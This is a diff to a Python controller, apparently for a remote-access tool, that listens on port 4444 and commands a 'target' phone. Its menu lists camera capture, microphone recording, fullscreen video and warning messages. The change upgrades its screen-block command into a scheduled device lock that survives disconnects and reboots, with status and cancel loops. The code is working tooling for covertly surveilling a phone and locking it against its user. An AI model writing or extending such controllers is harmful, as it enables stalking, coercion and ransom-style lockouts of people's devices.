@@ -6,6 +6,7 @@ import socket
 import struct
 import sys
 import time
+import uuid
 
 HOST = "0.0.0.0"
 PORT = 4444
@@ -342,7 +343,7 @@ class PhoneController:
             print("12. Show device info")
             print("13. Capture camera photo")
             print("14. Record microphone audio")
-            print("15. Block screen")
+            print("15. Block screen (strict managed lock)")
             print("16. Play fullscreen video")
             print("17. Show serious warning message")
             print("18. Exit")
@@ -619,26 +620,109 @@ class PhoneController:
         return True
 
     def _block_screen(self):
-        """Send a temporary fullscreen screen-lock request to the target.
+        """Start a strict managed-device lock session (v2) and drive its follow loop.
 
-        The target locks the screen for the requested duration and releases it
-        automatically. Returns True if the command was sent, False on invalid
-        input.
+        Wire format: block_screen:<duration>[:<delay>[:<session_id>]]
+        - A strict lock REQUIRES Device Owner (or admin + lock-task-permitted).
+          Without it the target replies STRICT_BLOCK_UNAVAILABLE (no fake lock).
+        - The session persists independent of the TCP connection: scheduled and
+          active sessions survive disconnect/service restart/reboot (remaining
+          time is preserved, not reset).
+        - Only one session at a time; a new start explicitly replaces the old.
+
+        This method handles sending + receiving itself, so it returns False to
+        tell the caller to skip its normal receive step.
         """
-        print("Selected: Block screen (temporary screen lock).")
-        print("  - Duration 1-86400 seconds; the lock auto-releases on expiry.")
-        print("  - If the app is a Device Owner, managed-device APIs are used "
-              "(lock task + keyguard), so Home/Overview cannot dismiss it.")
-        print("  - Otherwise it is a fullscreen app-level lock and the reply "
-              "reports the actual mode honestly.")
-        duration_str = input("Duration in seconds: ").strip()
+        print("Selected: Block screen (STRICT managed-device lock).")
+        print("  - Requires Device Owner or (admin + lock task permitted).")
+        print("  - Real managed locks only: device owner/administrator API and")
+        print("    Lock Task kiosk. No fake fullscreen lock is ever reported.")
+        print("  - The lock persists independently of this controller session;")
+        print("    it auto-releases after the duration.")
+        mode = input("Mode (1=start now, 2=scheduled): ").strip()
+        if mode not in ("1", "2"):
+            print("Result: Error - choose 1 (start now) or 2 (scheduled).")
+            return False
+        duration_str = input("Duration in seconds (1-86400): ").strip()
         duration = _parse_duration(duration_str)
         if duration is None:
             print("Result: Error - duration must be an integer between 1 and 86400 seconds.")
             return False
-        self.send_command(f"block_screen:{duration}")
-        print(f"Locking the target screen for {duration} seconds...")
-        return True
+        delay = 0
+        if mode == "2":
+            delay_str = input("Start delay in seconds (0-86400): ").strip()
+            delay = _parse_int_in_range(delay_str, 0, 86400)
+            if delay is None:
+                print("Result: Error - delay must be an integer between 0 and 86400 seconds.")
+                return False
+        session_id = input("Session ID (optional, Enter to auto-generate): ").strip()
+        if session_id:
+            if not session_id.replace("-", "").replace("_", "").isalnum():
+                print("Result: Error - session id must be alphanumeric (dashes/underscores allowed).")
+                return False
+        if not session_id:
+            session_id = "BS-" + uuid.uuid4().hex[:8].upper()
+
+        cmd = f"block_screen:{duration}:{delay}:{session_id}"
+        self.send_command(cmd)
+        print(f"Requesting session '{session_id}' ({duration}s, delay {delay}s)...")
+
+        try:
+            result = receive_message(self.client_socket)
+        except (ConnectionError, OSError, EOFError):
+            print("Lost connection to device while starting block screen.")
+            return False
+        print(f"Result: {result}")
+
+        if "STRICT_BLOCK_UNAVAILABLE" in result or not result.startswith("BLOCK_SCREEN_STARTED"):
+            return False
+
+        try:
+            self._block_screen_follow_loop(session_id)
+        except (ConnectionError, OSError, EOFError):
+            print("Lost connection to device during block-session follow loop.")
+        except KeyboardInterrupt:
+            print("\nFollow loop interrupted (session remains active on device).")
+        return False
+
+    def _block_screen_follow_loop(self, session_id):
+        """Interactive loop around an active block session.
+
+        Enter                    -> show session status
+        c                        -> cancel the session (real managed release)
+        x                        -> back to main menu (session stays active)
+        Returns when the session is no longer active on the device.
+        """
+        print(f"\nSession {session_id} is running.")
+        print("Follow loop: [Enter]=status  [c]=cancel  [x]=back")
+        while True:
+            try:
+                key = input("> ").strip().lower()
+            except (EOFError, KeyboardInterrupt):
+                return
+            if key == "x":
+                print("Back to menu (session still active on device).")
+                return
+            if key == "c":
+                self.send_command("block_screen_cancel")
+                try:
+                    result = receive_message(self.client_socket)
+                except (ConnectionError, OSError, EOFError):
+                    print("Lost connection trying to cancel session.")
+                    return
+                print(f"Result: {result}")
+                return
+            # Enter (empty) or anything else -> status
+            self.send_command("block_screen_status")
+            try:
+                result = receive_message(self.client_socket)
+            except (ConnectionError, OSError, EOFError):
+                print("Lost connection during status check.")
+                return
+            print(f"Result: {result}")
+            if "State: NONE" in result:
+                print("The block session has ended on the device.")
+                return
 
     def _play_video(self):
         """Send a fullscreen video request to the target for playback.
